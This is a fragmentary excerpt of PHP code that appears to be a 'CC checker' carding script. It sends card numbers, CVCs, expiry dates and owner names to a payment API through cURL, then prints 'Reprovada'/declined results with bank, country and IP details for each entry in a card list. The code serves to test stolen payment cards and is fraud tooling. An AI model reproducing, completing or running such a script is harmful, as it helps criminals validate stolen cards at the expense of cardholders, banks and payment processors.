...
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]='.$last.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'');
...
$code = trim(strip_tags(GetStr($result2,'"code": "','"')));
...
echo '<br><span class="badge badge-danger">Reprovada ✗ </span> : ' . $lista . ' ➜ Card Declined ➜ IP: '.$ip.' ➜ ' . $type . ' ➜ ' . $scheme . ' ➜  ' . $bank . ' ➜ ' . $country . ' ➜ ' . $MADEBY . '</br>';
 ...
 echo '<br><span class="badge badge-danger">Reprovada ✗ </span> : ' . $lista . ' ➜ Unknown Error➜ IP: '.$ip.' ➜ ' . $type . ' ➜ ' . $scheme . ' ➜  ' . $bank . ' ➜ ' . $country . ' ➜ ' . $MADEBY . '</br>';
}
